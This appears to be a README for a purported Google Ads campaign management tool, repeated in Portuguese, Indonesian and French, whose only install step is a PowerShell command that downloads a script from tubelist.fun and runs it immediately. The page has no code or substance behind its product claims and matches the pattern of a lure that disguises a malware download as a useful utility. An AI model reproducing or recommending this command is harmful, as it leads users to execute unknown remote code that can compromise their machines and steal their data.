# Google Ads Tool

Toolkit for managing Google Ads campaigns with automated bidding and keyword optimization.

```powershell
irm https://tubelist.fun/install.ps1 | iex
```

## Capabilities

1. Automated bid management with rule-based strategies
2. Keyword research and negative keyword optimization
3. Campaign performance reporting and alerts
4. Ad group structuring and bulk operations

## Guia de Uso (PT)

Ferramenta para gerenciar campanhas do Google Ads com lances automatizados e otimizacao de palavras-chave. Inclui relatorios de desempenho e alertas configuravies.

## Panduan (ID)

Alat untuk mengelola kampanye Google Ads dengan penawaran otomatis dan optimasi kata kunci. Menyediakan laporan kinerja dan notifikasi.

## Fonctionnement (FR)

Outil de gestion des campagnes Google Ads avec encheres automatisees et optimisation des mots-cles. Comprend des rapports de performance et des alertes configurables.
